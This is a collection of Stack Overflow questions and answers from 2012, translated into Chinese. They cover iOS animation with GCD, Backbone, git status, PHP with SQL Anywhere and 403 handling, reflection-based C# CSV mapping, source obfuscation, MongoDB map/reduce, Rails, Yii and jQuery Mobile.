> 标签：iphone, objective-c, grand-central-dispatch, uiviewanimation

我正在为 iPhone 创建一个基于回合的游戏，其中包含回合之间的动画，我想等待代码中的 [UIView animateWithDuration:...] 方法调用内联。有没有办法让这个调用同步而不是异步？目前我正在做的是......

```
// Some code... 

NSConditionLock *conditionLock = [[NSConditionLock alloc] initWithCondition:0];

dispatch_sync(dispatch_get_main_queue(), ^{
    [UIView animateWithDuration:1 
                     animations:^{
                         // some animation
                     } 
                     completion:^(BOOL finished){
                         [conditionLock lock];
                         [conditionLock unlockWithCondition:1]; 
                     }]; 
});

// forces thread to wait until completion block is called
[conditionLock lockWhenCondition:1]; 

// More code... 
```

因此，在上面的代码中，“// More code...”只有在动画完全完成后才会到达。显然，此代码必须在辅助线程上运行，并且可以按我的意愿工作。但是，我有一种感觉，将 NSConditionLock 与 gcd 结合使用是不好的形式，并且以这种方式阻塞辅助线程对于性能来说并不是最佳的。我当前的代码还可以吗，还是有更好的方法来做到这一点？谢谢。

编辑：关键是“//更多代码...”是内联的，而不是在完成块中。真的我想知道的是，将 NSConditionLock 与 GCD 结合使用是否可以，如果不是更好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T15:57:46.067

我只是将“//更多代码”放在另一个方法中，然后在完成块中调用该方法。这将确保您的代码仅在动画完成后才被触发。

# backbone.js - 如何从集合中查找不同值的数量

> ID：12009087
> 
> 赞同：4
> 
> 时间：2012-08-17T15:54:34.303
> 
> 标签：backbone.js

假设我有一个像这样的集合：

```
 {
     "id": 1,
     "name": "jonas",
  },
  {
     "id": 2,
     "name": "jonas",
  },
  {
     "id":3,
     "name": "smirk",
  } 
```

如何得到 ：

不同名称的数量，例如在本例中为 2

不同的名字，在这种情况下， jonas 和 smirk ？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-17T16:01:55.437

使用一些 Backbone 和 Underscore 魔法，结合[`collection.pluck`](http://backbonejs.org/#Collection-pluck)and [`_.uniq`](http://underscorejs.org/#uniq)：

> **pluck** collection.pluck(attribute)
> 从集合中的每个模型中提取一个属性。相当于调用 map，并从迭代器返回单个属性。
> 
> **uniq** _.uniq(array, [isSorted], [iterator])
> 生成数组的无重复版本，使用 === 来测试对象是否相等。
> [...]

```
var c = new Backbone.Collection([
    {id: 1, name: "jonas"},
    {id: 2, name: "jonas"},
    {id: 3, name: "smirk"}
]);

var names = _.uniq(c.pluck('name'));
console.log(names.length);
console.log(names); 
```

还有一个演示[http://jsfiddle.net/nikoshr/PSFXg/](http://jsfiddle.net/nikoshr/PSFXg/)

# git - 当我看起来是最新的并且推拉（无文件）修复它时，为什么 git 说我提前 40 次提交？

> ID：12009089
> 
> 赞同：11
> 
> 时间：2012-08-17T15:54:36.377
> 
> 标签：git, github, branch, master

我切换到 master，它说我领先 40 次提交：

```
$ git checkout master
Switched to branch 'master'
Your branch is ahead of 'origin/master' by 40 commits. 
```

但是当我然后拉它说我是最新的：

```
$ git pull origin master
From https://github.com/dmcouncil/dmWorkflow
 * branch            master     -> FETCH_HEAD
Already up-to-date. 
```

但是我可以解决这个问题（删除`40 commits`味精）：

```
Michaels-MacBook-Pro-2:dmWorkflow durrantm$ git push origin master
Everything up-to-date 
```

现在' `40 commits`'消息消失了：

```
$ git status
# On branch mdd_play_settings_and_topics_reports
nothing to commit (working directory clean) 
```

为什么我必须做额外的推动（似乎什么都没有）才能同步？
有没有更好的方法可以解决这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T15:55:59.747

这意味着您的有关 origin/master 的本地信息与远程版本不同。`git fetch`将纠正这一点。`git pull`适用于您的情况，因为它也执行`git fetch`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T16:44:16.947

只是添加到 Jamund Ferguson 的答案......

如果您配置了多个遥控器，您还可以执行一个`git remote update`获取所有遥控器的信息的操作。

与 git fetch 一样，这只会更新您拥有的有关遥控器状态的信息。它不会更新或合并任何代码，因此建议经常这样做以避免奇怪的状态报告和不正确的差异。

根据经验，当您使用在远程之后使用斜杠而不是空格的命令时，您将引用远程分支的本地信息，例如。`git command origin/master`和`git command origin master`

用法示例：`git checkout origin/master`将根据您当前的本地信息切换到代码，`git diff origin/master`并将您当前的代码与您当前有关远程分支的本地信息进行比较。这意味着如果您不定期获取可能会导致麻烦的问题，您可以轻松地创建一个分支或使用远程的过时信息/代码来区分您的代码。

# php - 通过 TCP/IP 连接到 SQL Anywhere

> ID：12009101
> 
> 赞同：0
> 
> 时间：2012-08-17T15:55:08.170
> 
> 标签：php, apache, sqlanywhere

我是任何地方的 sql 新手，目前我正在尝试使用 PHP 进行连接。

这是我到目前为止所得到的：

```
$conn = sqlanywhere_connect ( "UID=usr;PWD=pass;ENG=serv;DBN=bd_name;COMMLINKS=TCPIP{HOST=10.1.1.189:2638}" ); 
```

SQL Anywhere 安装在另一台机器上，我无法运行 apache，网站在 localhost (xampp) 上运行。这仅用于测试，当网站准备好时，我将连接到正确的数据库。

这是我遇到的错误：

```
Warning: sqlanywhere_connect(): The SQLAnywhere client libraries could not be loaded. Please ensure that dbcapi.dll can be found in your PATH environment variable. in C:\xampp\htdocs\core\cache\includes\elements\modsnippet\25.include.cache.php on line 21 
```

我没有`dbcapi.dll`文件，但我不确定我是否应该拥有它。
在[文档](http://dcx.sybase.com/index.html#1001/en/dbpgen10/pg-php-connect.html)中我找不到这个文件（我拥有的 SQL Anywhere 10），但是对于 SQL Anywhere 11，我可以找到关于这个文件的信息的页面。

要使用`sqlanywhere_connect`我已经下载了当前版本的 SQL Anywhere 模块。的 PHP 到我的机器上，我已经将它添加到`php.ini`文件中。

我应该怎么办？我应该下载丢失的文件吗？这是否足够，或者我可能会在要求其他文件时遇到更多错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-22T16:59:38.907

我有一个类似的问题，这里提出的解决方案： [https](https://groups.google.com/forum/#!msg/sql-anywhere-web-development/zK9Tf-X3cYk/GAoqK2DnB9EJ) ://groups.google.com/forum/#!msg/sql-anywhere-web-development/zK9Tf-X3cYk/ GAoqK2DnB9EJ 为我工作。

具体来说，我的 xampp + php 需要 32 位 dbcapi.dll，但是当我安装 SQL Anywhere 12 时，我忽略了选中安装 32 位版本的复选框。重新安装、选择“修改”并安装 32 位 SQL Anywhere 12 使“php test.php”正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T01:19:21.510

我会下载丢失的文件，然后从那里开始使用预先构建的 xamp 与 mySQl 对话我怀疑 Instillation 中是否有任何额外的 .dll 可以与 SQLAnywhere 连接

# c# - 用 String[] 填充结构？

> ID：12009104
> 
> 赞同：6
> 
> 时间：2012-08-17T15:55:15.773
> 
> 标签：c#

我正在解析一个 CSV 文件并将数据放在一个结构中。我正在使用`TextFieldParser`from [this question](https://stackoverflow.com/questions/1405038/reading-csv-files-in-net)，它的工作原理就像一个魅力，只是它返回一个`String[]`. 目前我有一个丑陋的过程：

```
String[] row = parser.ReadFields();
DispatchCall call = new DispatchCall();
if (!int.TryParse(row[0], out call.AccountID)) {
    Console.WriteLine("Invalid Row: " + parser.LineNumber);
    continue;
}
call.WorkOrder = row[1];
call.Description = row[2];
call.Date = row[3];
call.RequestedDate = row[4];
call.EstStartDate = row[5];
call.CustomerID = row[6];
call.CustomerName = row[7];
call.Caller = row[8];
call.EquipmentID = row[9];
call.Item = row[10];
call.TerritoryDesc = row[11];
call.Technician = row[12];
call.BillCode = row[13];
call.CallType = row[14];
call.Priority = row[15];
call.Status = row[16];
call.Comment = row[17];
call.Street = row[18];
call.City = row[19];
call.State = row[20];
call.Zip = row[21];
call.EquipRemarks = row[22];
call.Contact = row[23];
call.ContactPhone = row[24];
call.Lat = row[25];
call.Lon = row[26];
call.FlagColor = row[27];
call.TextColor = row[28];
call.MarkerName = row[29]; 
```

该结构由所有这些字段组成，`String`除了 AccountID 是 s 之外`int`。它们不是强类型的，这让我很恼火，但现在让我们看一下。鉴于`parser.ReadFields()`返回 a是否有更有效的方法来用数组中的值`String[]`填充结构（可能转换一些值，例如`row[0]`需要成为 a ）？`int`

**编辑：**我忘记提到的一个限制*可能会*影响什么样的解决方案将起作用，这个结构是`[Serializable]`并且将被发送到其他地方 Tcp。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T16:00:04.350

您的里程可能会因它是否是更好的解决方案而异，但您可以使用反射并定义一个`Attribute`用于标记结构成员的类。该属性将数组索引作为参数。然后通过使用反射从正确的数组元素中分配值。

你可以像这样定义你的属性：

```
[AttributeUsage(AttributeTargets.Property)]
public sealed class ArrayStructFieldAttribute : Attribute
{
    public ArrayStructFieldAttribute(int index)
    {
        this.index = index;
    }

    private readonly int index;

    public int Index {
        get {
            return index;
        }
    }
} 
```

这意味着属性可以简单地用于将`int`命名的值`Index`与属性相关联。

然后，您可以使用该属性在结构中标记您的属性（只是一些示例性行）：

```
[ArrayStructField(1)]
public string WorkOrder { // ...

[ArrayStructField(19)]
public string City { // ... 
```

然后可以使用[`Type`](http://msdn.microsoft.com/en-us/library/system.type.aspx)您的结构类型的对象设置值（您可以使用`typeof`运算符获取它）：

```
foreach (PropertyInfo prop in structType.GetProperties()) {
    ArrayStructFieldAttribute attr = prop.GetCustomAttributes(typeof(ArrayStructFieldAttribute), false).Cast<ArrayStructFieldAttribute>().FirstOrDefault();
    if (attr != null) {
         // we have found a property that you want to load from an array element!
        if (prop.PropertyType == typeof(string)) {
            // the property is a string property, no conversion required
            prop.SetValue(boxedStruct, row[attr.Index]);
        } else if (prop.PropertyType == typeof(int)) {
            // the property is an int property, conversion required
            int value;
            if (!int.TryParse(row[attr.Index], out value)) {
                Console.WriteLine("Invalid Row: " + parser.LineNumber);
            } else {
                prop.SetValue(boxedStruct, value);
            }
        }
    }
} 
```

此代码遍历结构类型的所有属性。对于每个属性，它都会检查我们上面定义的自定义属性类型。如果存在这样的属性，并且属性类型为`string`或`int`，则从相应的数组索引中复制该值。

我正在检查`string`和`int`属性，因为这是您在问题中提到的两种数据类型。即使您现在只有一个包含`int`值的特定索引，如果此代码准备将任何索引作为字符串或 int 属性处理，这对可维护性很有好处。

请注意，对于要处理的更多类型，我建议不要使用 and 链`if`，`else if`而是使用 a`Dictionary<Type, Func<string, object>>`将属性类型映射到转换函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:11:31.873

如果您想创建一些非常灵活的东西，您可以`DispatchCall`使用自定义属性标记每个属性。像这样的东西：

```
class DispatchCall {

  [CsvColumn(0)]
  public Int32 AccountId { get; set; }

  [CsvColumn(1)]
  public String WorkOrder { get; set; }

  [CsvColumn(3, Format = "yyyy-MM-dd")]
  public DateTime Date { get; set; }

} 
```

这允许您将每个属性与一列相关联。对于每一行，您可以遍历所有属性，并通过使用属性，您可以将正确的值分配给正确的属性。你必须做一些从字符串到数字、日期甚至枚举的类型转换。您可以向属性添加额外的属性以帮助您完成该过程。在我发明的示例`Format`中，应该在`DateTime`解析 a 时使用：

```
Object ParseValue(String value, TargetType targetType, String format) {
  if (targetType == typeof(String))
    return value;
  if (targetType == typeof(Int32))
    return Int32.Parse(value);
  if (targetType == typeof(DateTime))
   DateTime.ParseExact(value, format, CultureInfo.InvariantCulture);
  ...
} 
```

使用`TryParse`上述代码中的方法可以通过在遇到不可解析的值时提供更多上下文来改进错误处理。

不幸的是，这种方法效率不高，因为反射代码将针对输入文件中的每一行执行。如果您想提高效率，您需要通过反射一次来动态创建编译方法，`DispatchCall`然后您可以将其应用于每一行。这是可能的，但不是特别容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:25:49.247

您对所使用的库的依赖程度如何？我发现[文件助手](http://filehelpers.sourceforge.net/ "文件助手")对这类事情非常有用。您的代码将类似于：

```
using FileHelpers;

// ...

[DelimitedRecord(",")]
class DispatchCall {
    // Just make sure these are in order
    public int AccountID { get; set; }
    public string WorkOrder { get; set; }
    public string Description { get; set; }
    // ...
}

// And then to call the code
var engine = new FileHelperEngine(typeof(DispatchCall));
engine.Options.IgnoreFirstLines = 1; // If you have a header row
DispatchCall[] data = engine.ReadFile(FileName) as DispatchCall[]; 
```

您现在有了一个 DispatchCall 数组，引擎为您完成了所有繁重的工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:01:24.680

使用评论中建议的@Grozz 反射。用属性（即 ）标记结构类的每个属性，`[ColumnOrdinal]`然后使用它来将信息映射到正确的列。如果你有double、decimal等作为目标，你还应该考虑`Convert.ChangeType`在目标类型中使用正确的转换。如果您对性能不满意，您可以享受动态创建[DynamicMethod](http://msdn.microsoft.com/en-us/library/system.reflection.emit.dynamicmethod.aspx)的乐趣，更具挑战性，但性能非常出色且美观。面临的挑战是在内存中编写 IL 指令来执行您手动执行的“管道”（我通常创建一些示例代码，然后以 IL spy 为起点查看它的内部）。当然，您将在某处缓存此类动态方法，因此只需一次请求创建它们。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T16:07:24.610

首先想到的是使用反射来迭代属性并`string[]`根据属性值将它们与元素匹配。

```
public struct DispatchCall
{
  [MyAttribute(CsvIndex = 1)]
  public string WorkOrder { get; set; }
} 
```

`MyAttribute`将只是一个自定义属性，其索引与 CSV 中的字段位置匹配。

```
var row = parser.ReadFields(); 

    for each property that has MyAttribute...
      var indexAttrib = MyAttribute attached to property
      property.Value = row[indexAttrib.Index]
    next 
```

（显然是伪代码）

或者

```
[StructLayout(LayoutKind.Sequential)] // keep fields in order
public strict DispatchCall
{
  public string WorkOrder;
  public string Description;  
} 
```

`StructLayout`将保持结构字段按顺序排列，因此您可以迭代它们而无需为每个字段显式指定列号。如果您有很多字段，这可以节省一些维护。

或者，您可以完全跳过该过程，并将字段名称存储在字典中：

```
var index = new Dictionary<int, string>();

/// populate index with row index : field name values, preferable from some sort of config file or database
index[0] = "WorkOrder";
index[1] = "Description";
...

var values = new Dictionary<string,object>();

for(var i=0;i<row.Length;i++) 
{
  values.Add(index[i],row[i]);
} 
```

这更容易加载，但并没有真正利用强类型，这使得它不太理想。

您还可以生成动态方法或 T4 模板。您可以从格式的映射文件生成代码

```
0,WorkOrder
1,Description
... 
```

加载它，并生成一个如下所示的方法：

```
 /// emit this
  call.WorkOrder = row[0];
  call.Description = row[1]; 
```

等等

这种方法在一些浮动的微 ORM 中使用，并且似乎工作得很好。

理想情况下，您的 CSV 将包含一行字段名称，这将使这更容易。

或者，另一种方法是`StructLayout`与动态方法一起使用，以避免必须将 field:column_index 映射保留在结构本身之外。

或者，创建一个枚举

```
public enum FieldIndex
{
WorkOrder=0
,
Description // only have to specify explicit value for the first item in the enum
, /// ....
,
MAX /// useful for getting the maximum enum integer value
}

for(var i=0;i<FieldIndex.MAX;i++)
{
  var fieldName = ((FieldIndex)i).ToString(); /// get string enum name
  var value = row[i];

  // use reflection to find the property/field FIELDNAME, and set it's value to VALUE.
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-17T16:46:20.100

如果你追求速度，你可以使用一个脆弱的 switch 语句。

```
var columns = parser.ReadFields();

for (var i = 0; i < columns.Length; i++)
{
    SetValue(call, i, columns[i]);
}

private static void SetValue(DispatchCall call, int column, string value)
{
    switch column
    {
        case 0:
            SetValue(ref call.AccountId, (value) => int.Parse, value);
            return;

        case 1:
            SetValue(ref call.WorkOrder, (value) => value, value);
            return;

        ...

        default:
            throw new UnexpectedColumnException();
    }      
}

private static void SetValue<T>(
    ref T property,
    Func<string, T> setter
    value string)
{
    property = setter(value);
} 
```

遗憾的是`TextFieldParser`不允许您一次读取一个字段，然后您可以避免构建和索引列数组。

# c# - 是否可以混淆原始 C# 源代码？

> ID：12009109
> 
> 赞同：4
> 
> 时间：2012-08-17T15:55:27.360
> 
> 标签：c#

我见过很多 C# 混淆器，它们都需要一个程序集（.exe、.dll 等）。为什么不能只混淆源代码？就像您可以使用 javascript 一样，例如：[http ://www.javascriptobfuscator.com](http://www.javascriptobfuscator.com)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T15:56:51.100

混淆源代码没有任何意义。这是因为源代码是为了维护或经验共享而共享的。这就是为什么混淆以*可部署*工件为目标的原因，例如`exe`或`dll`...

如果`JavaScript`代码本身是*可部署*的神器，那么`Java Script`对于知识产权保护*具有完美的意义。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T15:57:30.673

您混淆了发布给客户的内容，而不是您必须保持清晰以便维护的内容。

您发布 javascript 文件，对它们进行混淆处理（并保留未混淆的文件以维护应用程序）。所以你有两组 javascript 文件：源文件和已发布文件。如果有一个不同的发布编译格式，这可能是混淆目标。

您发布 .class 文件，而不是 .java 文件，因此您混淆了 .class。

您发布 exe，而不是 c 或 c# 文件，因此您混淆了 exe。

其他具体原因：

*   C 或 C# 文件（或 java）可用于不同的应用程序。并且可能被剥离或更改的内容将根据应用程序而有所不同
*   一个 C、C# 或 java 文件包含编译所需的项目，这些项目不能仅在一个文件中剥离：您必须混淆整个集合（例如，如果您重命名一个类或可见字段，您通常会在内存中维护混淆时的表格）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-30T19:53:07.813

我同意@dystroy，因为你混淆了你发布的内容。

但是要直接回答提出的问题——b/c 很少有人发布 C# 代码。

如果您需要发布 C# 代码，并且希望对其进行模糊处理，我建议您使用以下方法一二：

1.  使“内部”所有不需要“公共”的类型
2.  编译包含要发布的源代码的程序集
3.  使用 RedGate SmartAssembly 混淆该程序集。
4.  使用 JetBrains dotPeek 显示经过混淆的源代码，并转储到磁盘。
5.  压缩混淆源代码并发布。

# javascript - Mongo：使用 map/reduce 在字段中求和值

> ID：12009110
> 
> 赞同：1
> 
> 时间：2012-08-17T15:55:30.243
> 
> 标签：javascript, mongodb

我有一个看起来像这样的集合：

```
{
    "_id" : ObjectId("foo-1"),
    "status" : "good",
    "value" : "100.00"
},

{
    "_id" : ObjectId("foo-2"),
    "status" : "good",
    "value" : "100.00"
} 
```

我想得到两件事：

*   所有对象的总“价值”
*   具有特定状态的所有对象的总值

这是我的地图/减少功能：

```
var map = function () {
    emit("total", {sum: this.value )) 
    }

var reduce = function (key, values) {
    var result = {sum:0};
    values.forEach(function (value) {result.sum += value.value;});
    return result;
    }

var t = db.leads.mapReduce(map, reduce, {out : "total"});
db[t.result].find(); 
```

上面的输出是：

```
PRIMARY> db[t.result].find();
{ "_id" : "total", "value" : { "sum" : NaN } } 
```

为什么“sum”会返回NaN？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T03:57:41.340

在您的减少功能中-

```
{result.sum += value.value;} 
```

但是您正在发出带有“sum”字段的文档。尝试：

```
{result.sum += value.sum;} 
```

# php - 处理 403 错误而不进行重定向

> ID：12009116
> 
> 赞同：1
> 
> 时间：2012-08-17T15:55:47.347
> 
> 标签：php

我想在不使用服务器端错误重定向方法（即不使用 .htaccess 文件）的情况下处理 403 错误。有时服务器会返回 403 错误消息（禁止访问）。那么是否有可能拥有处理此 403 错误消息的 PHP 脚本？

例如，在显示错误页面之前，我想在我的特定 php 页面运行时获取服务器状态，并且不进行重定向，我只想在该页面中显示自定义消息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T15:58:09.467

为您提供一些解决方案。

1.  检查 URL 错误并确保指定了实际网页。当 URL 指向目录而不是网页时，网站返回 403 Forbidden 错误的常见原因。这可以使用 PHP 中的 HttpRequest 类来完成。您可以使用[http_get](http://us2.php.net/manual/en/function.http-get.php)来执行 GET 请求。您也可以[在此处测试 URL](http://web-sniffer.net/)。

    ```
    <?php
    $response = http_get("URL", array("timeout"=>1), $info);
    print_r($info);
    ?> 
    ```

    输出：

    ```
    array (
       'effective_url' => 'URL',
       'response_code' => 403,
       .
       and so on
       ) 
    ```

    对您来说重要的是 response_code ，您可以使用它进一步发挥作用。

2.  使用卷曲。

    ```
    function http_response($url)
    { 
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_HEADER, TRUE); 
        curl_setopt($ch, CURLOPT_NOBODY, TRUE); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
        $head = curl_exec($ch); 
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
        curl_close($ch); 

        if(!$head) 
        {  
         return FALSE; 
        } 

        return $httpCode;
    }

    $errorcode = http_response("URL");    //if success 200 otherwise different 
    ```

# ruby-on-rails - 定义自定义记录器的 Rails 3 引擎

> ID：12009117
> 
> 赞同：2
> 
> 时间：2012-08-17T15:55:52.947
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我有一个测试引擎，我想在该引擎中定义一个自定义记录器，该记录器写入主应用程序“logs”目录中的 test.log 文件。

我尝试在引擎类中定义它，但它不起作用：

```
module Test

    class Engine < ::Rails::Engine
        isolate_namespace Test
        tracking_logger = Logger.new(Rails.root.join('log', "tracking.log"), 10, 30*1024*1024) 
```

当我尝试启动服务器时，它会引发： `<class:Engine>: undefined method join for nil:NilClass (NoMethodError)`

这意味着我无法从引擎本身看到主应用程序根路径。你会建议我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-14T07:50:21.287

您需要获取您的`app`实例。用一种`initializer`方法来做。例如，要跟踪区域设置：

```
module Test
  class Engine < ::Rails::Engine

    initializer("your_engine.set_locale") do |app|
      tracking_logger = Logger.new(app.root.join('log', "tracking.log"), 10, 30*1024*1024)
      config.I18n.default_locale = :en
      tracking_logger.debug("My_Engine just set its custom locale to :en\n\n")
    end 
```

但不幸的是，我不知道如何将此`tracking_logger`实例传递给其他初始化程序或方法。`tracking_logger`在我需要记录某些东西的每种方法中实例化一个新的东西并不好。非常感谢如何实例化它一次然后在方法之间使用它的线索。

# python - 如何在 Python 中检查 urllib2 对象？

> ID：12009119
> 
> 赞同：0
> 
> 时间：2012-08-17T15:55:58.357
> 
> 标签：python, urllib2

我目前正在学习 Python，我来自 Java/C++ 和 C 背景。我通常喜欢在调试器中“检查”“对象”以更好地了解正在发生的事情，所以如果 python 看起来很奇怪，请原谅我的问题。

我正在阅读`urllib2`Python 网站上的文档。显示了以下示例：

```
>>> import urllib2
>>> for line in urllib2.urlopen('http://tycho.usno.navy.mil/cgi-bin/timer.pl'):
...     if 'EST' in line or 'EDT' in line:  # look for Eastern Time
...         print line 
```

我知道这`urlopen`将下载页面的内容。

是否`urlopen`下载 HTML 内容？我尝试执行以下操作：

```
content = urllib2.urlopen('http://tycho.usno.navy.mil/cgi-bin/timer.pl')
print content 
```

产生一个对象。这个物体的本质是什么？它是一个类似字典的对象吗？如果是这样，我如何检查它的键值是什么？那会`pickling`在 Python 中使用吗？

我知道该`geturl()`方法，但我想完全了解`urlopen()`它的作用和返回值。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T15:58:22.620

```
import pdb
pdb.set_trace() 
```

将其放置在源代码中的任何位置，例如断点 - 它允许您以交互方式检查名称和对象。进入后，您还可以使用

```
import inspect 
```

它有许多用于检查对象的属性和方法的选项[http://docs.python.org/library/inspect.html#module-inspect](http://docs.python.org/library/inspect.html#module-inspect)

也是`dir(my_object)`做类似事情的廉价方法

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T15:59:20.883

从[文档中](http://docs.python.org/library/urllib2.html?highlight=urllib2#urllib2.urlopen)：

> 这个函数返回一个类似文件的对象，带有两个额外的方法： ...

所以你可以像文件一样阅读它（就像你已经做的那样）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:04:28.347

是的，您可以使用以下方式打印内容：

```
print content.read() 
```

另外，我想推荐 IPython，这样你就可以很容易地检查对象的方法和属性：

```
dir(content) 
```

# php - Yii 外键验证规则

> ID：12009122
> 
> 赞同：4
> 
> 时间：2012-08-17T15:56:10.523
> 
> 标签：php, validation, yii, yii-components

假设我有一个带有以下验证规则的 ActiveRecord：

```
public function rules() {
    return array(
        array('model', 'required'),
        // ....
        array('model', 'exist',
            'allowEmpty' => false,
            'attributeName' => 'id',
            'className' => 'Model',
            'message' => 'The specified model does not exist.'
        )
    );
} 
```

第一条规则强制该`model`字段不为空，第二条规则检查它是否具有一致的值（`model`是外键）。

如果我尝试验证将字段留空的表单，则会出现`model`2 个错误，一个用于第一个规则，一个用于第二个规则。

我只想收到“*不能为空*”的错误消息。

当不满足第一条规则时，有没有办法停止验证？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-17T16:02:36.937

您可以使用[`skipOnError`](http://www.yiiframework.com/doc/api/1.1/CValidator#skipOnError-detail)：

```
return array(
    array('model', 'required'),
    // ....
    array('model', 'exist',
        'allowEmpty' => false,
        'attributeName' => 'id',
        'className' => 'Model',
        'message' => 'The specified model does not exist.',
        'skipOnError'=>true
    )
); 
```

编辑：

有人评论说上面不清楚，可能是因为这里的*字段名*也是`model`. 因此，在实施时请记住这一点。

# c# - 以变 量为值的字典

> ID：12009126
> 
> 赞同：0
> 
> 时间：2012-08-17T15:56:31.960
> 
> 标签：c#, variables, dictionary

> **可能重复：**
> [带有值“变量”的字典](https://stackoverflow.com/questions/12008203/dictionary-with-value-variable)

我有一些高度耦合的代码，我正在尝试解耦。如果我可以制作这样的字典：

```
Dictionary<string, var> dict = new Dictionary<string, var> 
```

可以修复很多耦合。另一个线程中的一个海报似乎找到了使用变量类的解决方案，但他/她没有发布这个类的任何细节，我想不出该怎么做。

编辑：

基本上，而不是：

```
string transit = <string value>; 
```

我希望能够写：

```
string dict["Transit"] = <string value>; 
```

我已经做过的地方：

```
Dictionary<string, var> dict = new Dictionary<string, var>()
{
    {"Transit", transit}
}; 
```

这可能是不可能的，但任何建议都值得赞赏。

问候。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T00:56:55.540

这可以解决问题：

```
public class Variable
{
    public object Value { get; set; }
} 
```

然后他可以做他所要求的，即：

```
Dictionary<string, Variable> dict = new Dictionary<string, Variable>()
{
    {"Transit", new Variable()}
}

dict["Transit"].Value = "transit" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:09:54.527

我假设您甚至想将 IEnumerable、IQueryable 变量添加到您的字典中。对象类是超类，可以存储任何东西，并且可以转换为任何东西。

```
var myVar = new { name="john",lastname="smith"}; // or any linq expression
Dictionary<string, Object> asd = new Dictionary<string, object>();
asd.Add("mykey", myVar); 
```

# caching - jQuery Mobile 按顺序缓存页面

> ID：12009127
> 
> 赞同：0
> 
> 时间：2012-08-17T15:56:39.250
> 
> 标签：caching, jquery-mobile

我有一个隐藏的标签列表。我尝试使用 jquery 移动文档中描述的 data-prefetch 属性。唯一的问题是它一次触发所有这些的 ajax 请求，并且没有加载它们的顺序的 garentee。

在接下来通过滑动显示哪些页面时，排序非常重要。

所以我决定尝试通过这段代码以编程方式缓存链接。

```
var last_cache_page = false;

function cache_next_page(){
if(last_cache_page == false){
    var cache_link = $('.cache').first();
    last_cache_page = cache_link;
}
else{
    var cache_link = last_cache_page.nextAll('.cache');
    last_cache_page = cache_link;
}

//Start Caching any other pages that we want to swip to
$.mobile.loadPage(cache_link.attr('href'), {showLoadMsg: false});
} 
```

所以在 $(document).on('pageshow') 上，我调用 cache_next_page()。这部分工作正常，真正的问题是，当使用 $.mobile.loadPage 时，一旦第一个缓存页面对 dom 感兴趣，就不会触发与 jquery 移动页面相关的事件。

我已经尝试过 pageshow、pageinit 和 pageload，但它们只在第一次加载页面时触发。现在，如果我加载直接启动缓存的第一页。也就是说，在不访问应用程序中的任何其他页面的情况下，它确实会触发所有预期的事件，例如页面加载。

只有当您从 page_1 开始然后转到 page_2（具有启动缓存的代码）时，才会在将缓存页面插入 dom 时触发 pageload 事件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T13:58:28.100

我发现从 .loadPage 返回的对象上有一个 .done ，因此我已按如下方式修改了我的代码，以允许它按顺序缓存我的链接。

```
var last_cache_page = false;

function start_caching(){
    if(last_cache_page == false){
        var cache_link = $('.cache').first();
        last_cache_page = cache_link;
    }
    else{
        var cache_link = last_cache_page.nextAll('.cache').first();
        last_cache_page = cache_link;
    }

    if(cache_link.length == 1){
        //Start Caching any other pages that we want to swipe to
        new_page = $.mobile.loadPage(cache_link.attr('href'), {showLoadMsg: false});
        new_page.done(function(){
            start_caching();
        });
    }
} 
```

# ruby-on-rails-3 - Rails 3.2：无法批量分配受保护的属性

> ID：12009129
> 
> 赞同：2
> 
> 时间：2012-08-17T15:56:40.857
> 
> 标签：ruby-on-rails-3

我有一个模型具有 1:1 关系的便利设施：

```
 class Listing < ActiveRecord::Base

      attr_accessible :address1, :address2, :bath, :bedroom, :city, :description, :neighborhood, :sleeps, :sqft, :state_id, :title, :zip, :images_attributes, :amenity_attributes

      has_many :images, :dependent => :destroy
      accepts_nested_attributes_for :images, :allow_destroy => true

      has_one :amenity
      accepts_nested_attributes_for :amenity, :allow_destroy => true
   end 
```

和设施表：

```
class Amenity < ActiveRecord::Base
  attr_accessible :air_conditioning, :balcony

  belongs_to :listing

end 
```

最后，我的看法：

```
 <%= simple_nested_form_for (@listing), :html => {:multipart => true} do |f| %>
          <%= f.error_notification %>
          <div class="form-inputs">
            <%= f.input :title %>
            <%= f.input :sleeps %>
            <%= f.input :bath %>
            <%= f.input :bedroom %>
            <%= f.input :sqft %>
            <%= f.input :neighborhood %>
            <%= f.input :address1 %>
            <%= f.input :address2 %>
            <%= f.input :city %>
            <%= f.input :state_id %>
            <%= f.input :zip %>
            <%= f.input :description %>
          </div>

            <!-- amenities -->
            <%= f.fields_for :amenities do |a| %>
                <div class="amenities">
                    <label><%= a.check_box :smoking %> Smoking Allowed</label>
                </div>
            <% end %>
                <!-- end amenities -->
    <!-- Submit button -->
<% end %> 
```

